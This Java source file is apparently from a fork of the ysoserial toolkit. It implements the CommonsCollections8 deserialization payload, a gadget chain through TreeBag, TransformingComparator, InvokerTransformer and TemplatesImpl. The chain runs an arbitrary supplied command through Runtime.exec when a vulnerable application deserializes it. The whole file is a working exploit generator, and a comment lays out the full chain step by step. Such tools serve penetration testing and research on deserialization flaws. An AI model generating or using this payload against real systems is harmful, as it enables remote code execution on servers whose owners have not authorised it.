package ys.payloads;

import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ys.payloads.annotation.Authors;
import ys.payloads.annotation.Dependencies;
import ys.payloads.util.Gadgets;
import ys.payloads.util.PayloadRunner;
import ys.payloads.util.Reflections;

/*

    https://github.com/wh1t3p1g/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java

	Gadget chain:
        org.apache.commons.collections4.bag.TreeBag.readObject
        org.apache.commons.collections4.bag.AbstractMapBag.doReadObject
        java.util.TreeMap.put
        java.util.TreeMap.compare
        org.apache.commons.collections4.comparators.TransformingComparator.compare
        org.apache.commons.collections4.functors.InvokerTransformer.transform
        java.lang.reflect.Method.invoke
        sun.reflect.DelegatingMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke0
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer
            ... (TemplatesImpl gadget)
        java.lang.Runtime.exec
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.NAVALORENZO + " Compile integration:",Authors.BEARCAT})
public class CommonsCollections8 extends PayloadRunner implements ObjectPayload<TreeBag> {

    public TreeBag getObject(final String command) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(command);


        // setup harmless chain
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(templates);

        // arm transformer
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        return tree;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections8.class, args);
    }

}